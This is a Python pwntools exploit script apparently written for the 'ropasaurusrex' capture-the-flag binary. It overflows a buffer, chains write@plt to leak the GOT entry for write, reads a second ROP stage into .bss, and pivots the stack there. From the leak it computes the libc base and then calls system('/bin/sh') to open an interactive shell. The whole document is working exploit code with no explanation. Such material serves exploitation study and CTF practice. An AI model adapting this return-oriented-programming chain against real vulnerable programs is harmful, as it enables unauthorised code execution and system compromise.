from pwn import *
libc = ELF('/usr/lib32/libc.so.6', checksec=False)
elf = ELF('./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d', checksec=False)
bss = 0x8049628 + 0x100
pop3_ret = p32(0x080484b6) # 0x080484b6: pop esi; pop edi; pop ebp; ret; 
payload = b''.join([
    cyclic(0x88), p32(0),

    # do write@plt to leak write@got
    p32(elf.plt['write']), pop3_ret,
    p32(1),                 # ebx
    p32(elf.got['write']),  # ecx
    p32(4),                 # edx

    # do read@plt to write ret2bss rop
    p32(elf.plt['read']), pop3_ret,
    p32(0),                 # ebx
    p32(bss),               # ecx
    p32(0x100),             # edx

    # do ret2bss
    p32(0x080483c3),    # pop ebp; ret;
    p32(bss-4),         # ebp
    p32(0x080482ea),    # leave; ret;

])
p = elf.process()
p.sendline(payload)
write_got = u32(p.recv(4))
libc.address = write_got - libc.sym['write']
log.info(f'libc base 0x{libc.address:x}')
payload = b''.join([
    p32(libc.sym['system']), p32(0),
    p32(next(libc.search(b'/bin/sh'))),
])
p.sendline(payload)
p.interactive()
